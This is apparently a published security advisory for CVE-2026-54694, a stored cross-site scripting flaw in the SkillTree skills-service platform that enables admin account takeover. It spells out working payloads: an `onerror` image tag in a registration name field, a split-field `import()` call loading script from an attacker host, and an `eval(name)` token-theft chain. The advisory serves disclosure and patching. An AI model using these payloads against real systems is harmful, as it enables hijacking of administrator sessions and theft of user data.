# [C] NationalSecurityAgency/skills-service has Stored XSS via User Registration Enabling Admin Account Takeover

## Summary
Severity: Critical
Advisory: CVE-2026-54694
Aliases: GHSA-hqfg-c8wf-w2g8
CVSS: 9.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L)
Published: 2026-09-09
Source: https://osv.dev/vulnerability/CVE-2026-54694
Type: osv

## Details
SkillTree is a micro-learning gamification platform. Prior to version 4.4.2, two independent code flaws combine into a single exploitable attack chain, with three distinct exploitation paths of escalating impact. `StringHighlighter.js` builds an HTML string by interpolating raw `value` substrings directly into a template literal with no HTML entity encoding. `HighlightedValue.vue` renders that string — and all unfiltered plain values — via Vue's `v-html` directive, which sets `innerHTML`. Separately, the account registration endpoint accepts `firstName`, `lastName`, and `nickname` fields and stores them without any HTML sanitization. An attacker self-registers with `firstName = "<img src=x onerror=alert(1)>"` (28 characters — within the 30-character field limit) and visits any quiz. The next time an administrator opens the Quiz Runs page the payload executes in their browser. Three attack paths exist with escalating impact. The first is basic cross-site scripting. Any self-contained payload fitting the 30-character limit (e.g. `<img src=x onerror=alert(1)>`, which is 28 chars) fires automatically when the admin navigates to the runs page through normal use. Arbitrary code execution in the admin's browser is confirmed with zero extra steps. The second is remote script loading via `import()`. Using the split-field technique (`lastName = "<img src=x"`, `firstName = "onerror=import('//nsas.cc/p')>"`), the attacker loads a full JavaScript file from their server. The file has no size limit and can perform any admin action — delete all projects, create backdoor accounts, dump user data, install a keylogger. No phishing required. The only constraint is that the URL must fit in 11 characters (`//nsas.cc/p`). The third is full cross-site request forgery token theft. Using `eval(name)`, the attacker pre-sets `window.name` to a data-theft payload by sending the admin one redirect link first. The session cookie is `HttpOnly` and cannot be read via `document.cookie`; however, the XSRF token is readable and the attacker leverages same-origin execution to call admin APIs from inside the victim's browser, relaying the responses to an external server. No admin interaction beyond routine use is required. Version 4.4.2 contains a patch.

## References
- https://github.com/CVEProject/cvelistV5/tree/main/cves/2026/54xxx/CVE-2026-54694.json
- https://github.com/NationalSecurityAgency/skills-service/security/advisories/GHSA-hqfg-c8wf-w2g8
- https://nvd.nist.gov/vuln/detail/CVE-2026-54694
